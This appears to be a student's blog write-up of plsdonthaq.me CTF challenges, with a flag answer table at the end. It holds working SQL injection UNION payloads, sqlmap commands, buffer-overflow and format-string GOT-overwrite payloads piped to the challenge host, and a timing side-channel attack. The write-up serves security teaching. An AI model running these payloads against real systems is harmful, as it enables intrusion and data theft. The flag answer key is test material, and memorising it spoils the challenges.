---
title: "plsdonthaq.me CTF Challenges"
date: 2019-07-25T13:34:08+10:00

categories: ["Extended Security", "Musings"]
hiddenFromHomePage: false
postMetaInFooter: false

flowchartDiagrams:
  enable: false
  options: ""

sequenceDiagrams: 
  enable: false
  options: ""

---

***WARNING: SPOILERS***  
***WARNING: SPOILERS***  
***WARNING: SPOILERS***  
***WARNING: SPOILERS***  
***WARNING: SPOILERS***  
***WARNING: SPOILERS***  

---

The tutors released some CTF questions at [plsdonthaq.me](http://plsdonthaq.me). Keen!

# Category: Hard
## <s>trivial</s>

<details>

[[trivial]](trivial)

**Analysis**  
There's something _trivial_ about this program...  

Let's take a look at the dissasembly with `objdump -d trivial`, especially at `trivial_malloc` and `trivial_free`.  

```asm
000000000000178d <trivial_malloc>:
    178d:       55                      push   %rbp
    178e:       48 89 e5                mov    %rsp,%rbp
    1791:       48 83 ec 10             sub    $0x10,%rsp
    1795:       89 7d fc                mov    %edi,-0x4(%rbp)
    1798:       b8 00 00 00 00          mov    $0x0,%eax
    179d:       e8 7e f9 ff ff          callq  1120 <rand@plt>
    17a2:       99                      cltd   
    17a3:       c1 ea 0f                shr    $0xf,%edx
    17a6:       01 d0                   add    %edx,%eax
    17a8:       25 ff ff 01 00          and    $0x1ffff,%eax
    17ad:       29 d0                   sub    %edx,%eax
    17af:       05 00 00 40 00          add    $0x400000,%eax
    17b4:       83 e0 f8                and    $0xfffffff8,%eax
    17b7:       48 98                   cltq   
    17b9:       c9                      leaveq 
    17ba:       c3                      retq   

00000000000017bb <trivial_free>:
    17bb:       55                      push   %rbp
    17bc:       48 89 e5                mov    %rsp,%rbp
    17bf:       48 89 7d f8             mov    %rdi,-0x8(%rbp)
    17c3:       90                      nop
    17c4:       5d                      pop    %rbp
    17c5:       c3                      retq   
    17c6:       66 2e 0f 1f 84 00 00    nopw   %cs:0x0(%rax,%rax,1)
    17cd:       00 00 00 
```

Hm...

Let's use a decompiler for an easier understanding of these two functions.

```c
// 0x000000000000178D
int64 trivial_malloc() {
  return (signed int)((rand() % 0x20000 + 0x400000) & 0xFFFFFFF8);
}

// 0x00000000000017BB
void trivial_free() {

}
```

There's ... no `malloc`? Nor is there a `calloc` anywhere?  
And you can definitely see that if you search the dissasembly `objdump -d trivial | grep malloc`.

So, the assignment of our items into the heap is being controlled **manually**!

There's also this function called `con`

```asm
0000000000001716 <con>:
    1716:       55                      push   %rbp
    1717:       48 89 e5                mov    %rsp,%rbp
    171a:       48 83 ec 10             sub    $0x10,%rsp
    171e:       bf 00 00 00 00          mov    $0x0,%edi
    1723:       b8 00 00 00 00          mov    $0x0,%eax
    1728:       e8 b3 f9 ff ff          callq  10e0 <time@plt>
    172d:       89 c7                   mov    %eax,%edi
    172f:       b8 00 00 00 00          mov    $0x0,%eax
    1734:       e8 77 f9 ff ff          callq  10b0 <srand@plt>
    1739:       be 00 00 00 00          mov    $0x0,%esi
    173e:       48 8d 3d bb 0a 00 00    lea    0xabb(%rip),%rdi        # 2200 <_IO_stdin_used+0x200>
    1745:       b8 00 00 00 00          mov    $0x0,%eax
    174a:       e8 a1 f9 ff ff          callq  10f0 <open@plt>
    174f:       89 45 f4                mov    %eax,-0xc(%rbp)
    1752:       8b 45 f4                mov    -0xc(%rbp),%eax
    1755:       41 b9 00 00 00 00       mov    $0x0,%r9d
    175b:       41 89 c0                mov    %eax,%r8d
    175e:       b9 12 00 00 00          mov    $0x12,%ecx
    1763:       ba 03 00 00 00          mov    $0x3,%edx
    1768:       be 00 00 02 00          mov    $0x20000,%esi
    176d:       bf 00 00 40 00          mov    $0x400000,%edi
    1772:       e8 e9 f8 ff ff          callq  1060 <mmap@plt>
    1777:       48 89 45 f8             mov    %rax,-0x8(%rbp)
    177b:       8b 45 f4                mov    -0xc(%rbp),%eax
    177e:       89 c7                   mov    %eax,%edi
    1780:       b8 00 00 00 00          mov    $0x0,%eax
    1785:       e8 16 f9 ff ff          callq  10a0 <close@plt>
    178a:       90                      nop
    178b:       c9                      leaveq 
    178c:       c3                      retq   
```

```c
// 0x0000000000001716
int con() {
  unsigned int v0; // eax@1
  int fd; // ST04_4@1

  v0 = time(0LL);
  srand(v0);
  fd = open("/dev/zero", 0);
  mmap((void *)0x400000, (size_t)&unk_20000, 3, 18, fd, 0LL);
  return close(fd);
}
```

It's some sort of function that sets the seed for `rand`, as well as read a whole chunk of zeros into the memory (our heap address).  
Although I don't see this function being called anywhere - it supposedly runs before `main`

Also, checking the security of this file with `checksec --file=./trivial`:

```bash
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Fortified       Fortifiable  FILE
Partial RELRO   Canary found      NX disabled   PIE enabled     No RPATH   No RUNPATH   95 Symbols     Yes      0               3        ./trivial
```

We'll be dealing with a binary that has partial RELRO (Can override the GOT table if need be), a Stack Canary (Won't be able to _just_ do a buffer overflow - ish), and PIE enabled (memory space stuff)

We can see that the stack (and heap) is executable too, with `readelf -l ./trivial`:  
```
GNU_STACK      0x0000000000000000 0x0000000000000000 0x0000000000000000 0x0000000000000000 0x0000000000000000  RWE 0x10
```

The `E` in `RWE` stands for **E**xecutable.

---

**`trivial_malloc`**

This function returns a limited address range.

`(0x0 + 0x400000) & 0xFFFFFFF8 = 4194304`  
`(0x19999 + 0x400000) & 0xFFFFFFF8 = 4299160`

So we have a range of `104856` bytes.

As `sizeof(struct node)` is `24` (3x 8byte pointers), and name is 'allocated' `128` bytes, that's `152` bytes per item.  

`(4299160-4194304) / (24 + 128) = 689.84`  
So theoretically, we can have a maximum of 689 / 690 items before we are 'out' of free space

---

I made a breakpoint occur every time `create_item` finishes, to inspect the frame.  

After creating two items, we should expect `*(items)` and `*(items+8)` to be populated, as we do see.

```gdb
(gdb) p/x items                                                                                                                                                                               
$1 = 0x417c20                                                                                                                                                                                 
(gdb) p/x *(items) 
$2 = 0x555580a8                                                                                                                                                                               
(gdb) p/x *(items+8)                                                                                                                                                                          
$3 = 0x404450                                                                                                                                                                                 
(gdb) p/x *(items+16)                                                                                                                                                                         
$4 = 0x0                                                                                                                                                                                      
(gdb) p/x *(items+24)                                                                                                                                                                         
$5 = 0x0                                                                                                                                                                                      
```

I'm not sure what's going on, but it looks like `items[0]` points to an address that wasn't 'allocated'.

---

**glib versions**  


* most things - 2.2.5
* 2.2
* isoc99 functions - 2.7
* stack check - 2.4 

**Possible solutions**  


* heap overflow into shellcode
* Heap spray -> NOP sled \x90

</details>

# Category: Web
## cookie

<details>

> http://plsdonthaq.me:8001

**Solution**  
There's a browser cookie `admin` that is set to `0`.  
Simple just modify the cookie and set it to `1`.

Flag: `COMP6441{you_should_consider_doing_comp_[6843/6447]}`

</details>

## ezpz1.0

<details>

> http://plsdonthaq.me:8013

**Analysis**  
This is an SQL Injection question.  
Unfortunately a few too many people have been most likely [`sqlmap`](http://sqlmap.org/)-ing the poor website, and it was very slow to use (Rate limit your queries!!!).  
(_or, the server was slow to begin with_)

We're given a website with a login form, and a few links at the top.  
One says "flag", but it's a 404 - **it's a red herring**, so let's forget about that.

Doing some reconnaissance, we see that the SQL queries are performed unsafely.  
If we put a `'` into the username input, we're presented with a backend error

`''' LIMIT 1" LINE 3: ... WHERE username=''' ^ [SQL: "SELECT username, password\n FROM users\n WHERE username='''\n LIMIT 1"] (Background on this error at: http://sqlalche.me/e/f405)`

From here, we can see that the backend is using [SQLAlchemy](https://www.sqlalchemy.org/), a SQL library for Python.  
With some more research, we can see that the database is running [Postgres](https://www.postgresql.org/).  

Let's have a look at the query string.  

`"SELECT username, password FROM users WHERE username='' LIMIT 1"`

We see that the query is using apostrophes (`'`) to enclose the username and password strings, so **we also want to use apostrophes** in our exploit.  
We can also see that the password field is indirectly referenced - meaning that we won't be able to perform any sort of injection from the password input field (at least not with this query string alone).  

Firstly, let's guess a username - perhaps `admin`.  
Putting in `admin` and whatever password we want gives us an error saying that the **sha256(hash)** does not match.  
Interesting, so we know that the passwords might be hashed with SHA256.

We can therefore infer that some line of code in the server is performing a comparison: `if (sha256(input_password) == hash_inside_the_database) { ... }`.  

We can see from the SQL query, that the backend _first_ retrieves a record, and _then_ compares the record to our input.  
Obviously we don't have the password, let alone the SHA256 hash of the user `admin` (not yet at least) - but that's okay, we'll just provide our own hash!

We can perform an SQL injection into the username field to provide our own row with the `UNION` operator

Let's create a SHA256 hash of the letter `a` (our forced password)...  
`sha256("a") => ca978112ca1bbdcafac231b39a23dc4da786eff8147c4e72b9807785afee48bb`

Injecting `' UNION SELECT 'admin', 'ca978112ca1bbdcafac231b39a23dc4da786eff8147c4e72b9807785afee48bb'--` into the username field, and using `a` as the password, we're presented with a welcome page, saying welcome `admin`!


Perhaps we can try get the password hash by concatenating the admin username and password as our first column in the union.

Inject: `' UNION SELECT 'admin' || password, 'ca978112ca1bbdcafac231b39a23dc4da786eff8147c4e72b9807785afee48bb' FROM users--`  
Result: `You are logged in as You are logged in as admin6d77eed869f7503fdc1a0c7feb648fffe2398a7b7952b91f0a7acc7fb7e26d2d`

So we've gotten the SHA256 password hash for `admin` to be `6d77eed869f7503fdc1a0c7feb648fffe2398a7b7952b91f0a7acc7fb7e26d2d`, which is probably a hash of the flag!

Let's see what else is in our `users` table.

To extract the names of the columns in our `users` table...  
`' UNION SELECT column_name, 'ca978112ca1bbdcafac231b39a23dc4da786eff8147c4e72b9807785afee48bb' FROM information_schema.columns WHERE table_name = 'users' OFFSET 0--`  
`' UNION SELECT column_name, 'ca978112ca1bbdcafac231b39a23dc4da786eff8147c4e72b9807785afee48bb' FROM information_schema.columns WHERE table_name = 'users' OFFSET 1--`  
`' UNION SELECT column_name, 'ca978112ca1bbdcafac231b39a23dc4da786eff8147c4e72b9807785afee48bb' FROM information_schema.columns WHERE table_name = 'users' OFFSET 2--`  

These queries give us the existence of three columns, `password`, `username`, and `id`

Searching for the entries in this table (_perhaps we had to find another user?_)...  
`' UNION SELECT id||'.'||username||'.'||password, 'ca978112ca1bbdcafac231b39a23dc4da786eff8147c4e72b9807785afee48bb' FROM users--`

It gives us just the admin row, `1.admin.6d77eed869f7503fdc1a0c7feb648fffe2398a7b7952b91f0a7acc7fb7e26d2d`

Unfortunately none of the SHA256 rainbow tables had this hash stored, and [HashCat](https://hashcat.net/hashcat/) didn't want to work for me.  
**But that's okay, because everything I just said was unnecessary in finding the flag!**

Instead what we want to do, is to navigate around the database to find the table which contains our flags!

**Solution**  
After snooping around for a bit, we find the existence of the `flag` table, to which we can then extract the flag with another SQL injection.

Inject: `' UNION SELECT flag, 'ca978112ca1bbdcafac231b39a23dc4da786eff8147c4e72b9807785afee48bb' FROM flag--`
Result: `You are logged in as You are logged in as COMP6443{literally_unhackable}`

Flag: `COMP6443{literally_unhackable}`

---

You could have also used [`sqlmap`](http://sqlmap.org/), which is a piece of software designed to do exactly these sort of things!

```
sqlmap -u http://plsdonthaq.me:8013/ --data username=* --method POST 
sqlmap -u http://plsdonthaq.me:8013/ --data username=* --method POST --dbs  
sqlmap -u http://plsdonthaq.me:8013/ --data username=* --method POST --dump 
```

</details>

# Category: Binary
## poodle

<details>

> Hello what is your favourite type of poodle?  
ENTER POODLE CHOICE NOW>   

[[buf2]](buf2)

**Solution**  
Looking at the disassembly of the code, `scanf` writes into a memory space that is `0x36` bytes long (54 bytes).  
The next 4 bytes are the return value, which we don't care about.

So we need to pad 58 bytes before we can override the return address to the address of `printFlag` (`0x08049259`).  

`python -c 'print("." * 58 + "\x08\x04\x92\x59"[::-1])' | nc plsdonthaq.me 1000`

Flag: `COMP6441{how_good_are_buffer_ove}rflows`

</details>

## format0

<details>

> ```
   ____                    __        __      _
  / __/__  ______ _  ___ _/ /_  ____/ /_____(_)__  ___ _
 / _// _ \/ __/  ' \/ _ `/ __/ (_.-/ __/ __/ / _ \/ _ `/
/_/  \___/_/ /_/_/_/\_,_/\__/ /___/__/ _/ /_/_//_/\_, /
                                                 /___/
Once thought to be just a lazy short cut,
actually leads to remote code execution!

A pointer to the flag is on the stack
format string>
```

[[format0]](format0)

**Solution**  
I reckon this question is broken, you don't need to try at all, just press enter.

Flag: `COMP6441{hacked_the_planet}`

</details>

## format2

<details>

[[format2_32]](format2_32)

**Analysis**  
Looking at the dissassembly of our binary, we see that this is a `printf` exploit.  
To store the input, the program uses `fgets` - to we're limited to 98 (0x63 - 1) bytes of input.  
Additionally, there is a stack canary which may halt our attempts - so we won't be doing a buffer overflow this time.  

(Evidently, because it's a format string challenge.)

Doing some analysis, the return address (EIP) of the `do_the_format` function is `0x080491fb`, which is stored at on the stack at `0xffffd55c`.  
We'll need to change it to `0x080492be`.

_(It was also the 35th item in the stack, but you wouldn't have been able to just write into `%35$n`, as it would write into the address referenced by the data in that slot, rather the address of the slot itself_

`<destinationAddress><destinationAddress+2>%<HI-8>c%5$n%<HI-LO>c%6$n`

Where:

* `destinationAddress` is the address which you wish to write into (`0xffffd55c`)
* `HI` is the first two bytes of the address we want to write (`0x0804`)
* `LO` is the last two bytes of the address we want to write (`0x92be`)

Doing that gives us this chain:  
`\x5c\xd5\xff\xff\x5e\xd5\xff\xff%37558c%6$n`

Now it didn't exactly work out for me, because `HI` - `LO` would give me a negative value, and I wasn't sure if that was right or if I had to do something special to fix that.  

After some research, I found a way to write two `short`s instead of a single `int`:  
`\x5c\xd5\xff\xff\x5e\xd5\xff\xff%37558c%2$hn%30022c%3$hn`

But jk it still didn't work - the stack was probably changing, so I couldn't just hardcode `0xffffd55c`

So I tried another approach, this time with the `GOT` entries.  

**Solution**  

**GOT** stands for _Global Offset Table_ and is a mechanism to redirect addresses to external functions (ie provided by libc).  

Looking at GOT entries of the binary with `readelf -r ./format2`, we get this:  
```
Relocation section '.rel.dyn' at offset 0x3fc contains 5 entries:                                                                                                                                               
 Offset     Info    Type            Sym.Value  Sym. Name                                                                                                                                                        
0804bfec  00000106 R_386_GLOB_DAT    00000000   _ITM_deregisterTMClone                                                                                                                                          
0804bff0  00000806 R_386_GLOB_DAT    00000000   __gmon_start__                                                                                                                                                  
0804bff4  00000a06 R_386_GLOB_DAT    00000000   stdin@GLIBC_2.0                                                                                                                                                 
0804bff8  00000b06 R_386_GLOB_DAT    00000000   stdout@GLIBC_2.0                                                                                                                                                
0804bffc  00000c06 R_386_GLOB_DAT    00000000   _ITM_registerTMCloneTa                                                                                                                                          
                                                                                                                                                                                                                
Relocation section '.rel.plt' at offset 0x424 contains 7 entries:                                                                                                                                               
 Offset     Info    Type            Sym.Value  Sym. Name                                                                                                                                                        
0804c00c  00000207 R_386_JUMP_SLOT   00000000   printf@GLIBC_2.0                                                                                                                                                
0804c010  00000307 R_386_JUMP_SLOT   00000000   fflush@GLIBC_2.0                                                                                                                                                
0804c014  00000407 R_386_JUMP_SLOT   00000000   fgets@GLIBC_2.0                                                                                                                                                 
0804c018  00000507 R_386_JUMP_SLOT   00000000   __stack_chk_fail@GLIBC_2.4                                                                                                                                      
0804c01c  00000607 R_386_JUMP_SLOT   00000000   puts@GLIBC_2.0                                                                                                                                                  
0804c020  00000707 R_386_JUMP_SLOT   00000000   system@GLIBC_2.0                                                                                                                                                
0804c024  00000907 R_386_JUMP_SLOT   00000000   __libc_start_main@GLIBC_2.0
```

At this point, it's just a matter of choosing an entry to override.  
I decided to override `fflush`, thinking that overriding `printf` might be bad since it's the function that will perform our exploit for us.  

So therefore, we would need to change the value at the address for `fflush`, `*(0x0804c010) = 0x080492be`.

I also seemed to need to add an extra "." at the start of my string to fix the alignment of characters.

So finally I used this format string `.\x10\x11\x12\x13%173c%6$hhn%212c%7$hhn%114c%8$hhn%4c%9$hhn` to gain access to the shell.

[[format2_solver.py]](format2_solver.py)

Flag: `COMP6441{hacked_the_planet_2}`

</details>

## int1

<details>

**Solution**  
I wasn't able to do this challenge the first time, despite doing the exact same thing when attempting it the next day...

We need to input a number that when multiplied by 2, is equal to 2674.  
That would be 1337 right!  

But if you try enter a number greater than or equal to forty, we'll get an error:  

```
Enter a number: 100
Sorry we can't hold numbers >= 40
Budget cuts, they hit everybody...
```

The way to solve this is to perform an integer overflow attack.

Any positive number stored as a _signed integer_ (4 bytes) greater than 2147483647 will cause that number to overflow into the largest negative number.  
Similarly, any negative number stored as a _signed integer_ (4 bytes) less than -2147483647 will cause that number to overflow into the largest positive number. 

So we'll need to enter in `-2147482311` as the value.  

Doing so drops us into a bash shell, where through some recon we can find the flag.

```
$> ls
bin
boot
dev
etc
flag <---- Flag file!!!
...

$> cat flag
COMP6441{hacked_the_ether}
```

Flag: `COMP6441{hacked_the_ether}`

---

Now, the usual piping didn't work, and I'm not entirely sure why it didn't work.  
I even tried adding a time delay between the prints, but it still wouldn't work.  
If anyone knows why this is the case, please let me know!

`python3 -c 'print(-(2*31)+1337)' | nc plsdonthaq.me 1003`

</details>

# Category: Crypto
## <s>birthday attack</s>
## diffie 1

<details>

> INTERCEPTING DIFFY HELLMAN KEY EXCHANGE  
Generator: `19`  
Modulus: `239`  
Alice: here is my (Generator^mySecret) Mod (Modulus): `184`  
Bob: here is my (Generator^mySecret) Mod (Modulus): `227`  
What is their shared key?  
Eve:

**Solution**

The problem with the Diffie Hellman key exchange, is that if the modulus is not large enough, we are able to brute-force crack the secret of each party.

In this case:  
Alice's secret is `37`  
Bob's secret is `171`  

Given either secret, by raising the received public data to our secret, and taking the modulus of that, we are able to determine the shared secret, which in this case is `178`

Entering `178` as Eve's response gives us the flag.

[[diffie1_solver.py]](diffie1_solver.py)  
Usage: `diffie1_solver.py (generator) (modulus) (public)`  
If it's taking too long, perhaps use another set of values of the questions

Flag: `COMP6441{haCk3rs_gunnA_H4K}`

</details>

## diffie 2

<details>

> BEGINING DIFFY HELLMAN KEY EXCHANGE  
Generator: `61`  
Modulus: `823`  
Here is (Generator^mySecret) Mod (Modulus): `373`  
Enter yours: ...  
Enter our secret number: ...

**Solution**  
This is just the standard application of the Diffie Hellman process - no brute-forcing or any sort of cracking needed here.

Pick any secret `s`, then create your public data (base^`s` % modulus), and use that as the value for "Enter yours".  
Then just raise the given public data to your secret apply the modulus for the "Our secret number"

**Trivial Solution**  
Just enter `1`, and `1`

Flag: `COMP6441{sEcuRe_tHe_plaNet!}`

</details>

## <s>MAC</s>
## vinegar

<details>

> adamt told me that his facebook password encrypted is this cipher text: Dlc_ppyq_mq_MSKZ6441{lymo_rri_esfqyr}

**Solution**  
Vinegar ... hm I wonder if it's a _vigenere_ cipher.

Apply some analysis, or just brute force it, to determine that the key is `key`.

Flag: `COMP6441{hack_the_gibson}`

</details>

## <s>hash length magic</s>

<details>

**Analysis**  
Nothing happens when you connect?  
_Or does it?_

When you enter more than 255 characters, you get this message:  
`Send me 0x100 bytes, [sha256(key + message) + message] Where message is get flag`

python3 -c 'key = "a"; m = "get flag"; import hashlib; xx = hashlib.sha256(key.encode() + m.encode()).hexdigest() + m; print(xx + "\x00" * (0x100 - len(xx)))' | nc plsdonthaq.me 9003

</details>

# Category: Misc

## shuffle

<details>

> Can you crack this?  
[[shuffle.txt]](shuffle.txt)

**Solution**
It's a bunch of ASCII art, with the lines shuffled.  
We can sort these lines (by increasing number) and after stripping this order information, we can read the flag from ASCII art.

[[shuffle_solver.py]](shuffle_solver.py)  
[[shuffle_solved.txt]](shuffle_solved.txt)

Flag: `MAKING ASCII ART IS A KEY PART OF THE HACKERS TOOLKIT`
</details>

## guess

<details>

> Can you guess the flag?  

**Analysis**  
The program is asking for some sort of password.  
If you try to enter `A`... it will instantly kick you out.  
If you try to enter `B`... it will instantly kick you out.  
If you try to enter `C`... there's a 0.5s delay... and then it kicks you out.  

What about a second letter?  
`CA` -> 0.5s, then kick  
`CB` -> 0.5s, then kick  
...  
`CO` -> **one second**, then kick.  

Hmm..

**Solution**  
For each correct letter (case-sensitive, order-sensitive), it takes an extra 0.5 seconds to validate.  
We can use this time-delay as a feedback mechanism to tell us if we are right or not!

So I hacked together a brute-forcing script, and let it run for a few minutes.  
After a while, we successfully retrieve the flag!

Flag: `COMP6441{trollllolollololllol7}`
</details>

# Just give me the answers

|Question|Flag|
|--:|:--|
|trivial|``|
|cookie|`COMP6441{you_should_consider_doing_comp_[6843/6447]}`|
|ezpz1.0|`COMP6443{literally_unhackable}`|
|poodle|`COMP6441{how_good_are_buffer_ove}rflows`|
|format0|`COMP6441{hacked_the_planet}`|
|format2|`COMP6441{hacked_the_planet_2}`|
|int1|`COMP6441{hacked_the_ether}`|
|birthday attack|``|
|diffie 1|`COMP6441{haCk3rs_gunnA_H4K}`|
|diffie 2|`COMP6441{sEcuRe_tHe_plaNet!}`|
|MAC|``|
|vinegar|`COMP6441{hack_the_gibson}`|
|hash length magic|``|
|shuffle|`MAKING ASCII ART IS A KEY PART OF THE HACKERS TOOLKIT`|
|guess|`COMP6441{trollllolollololllol7}`|

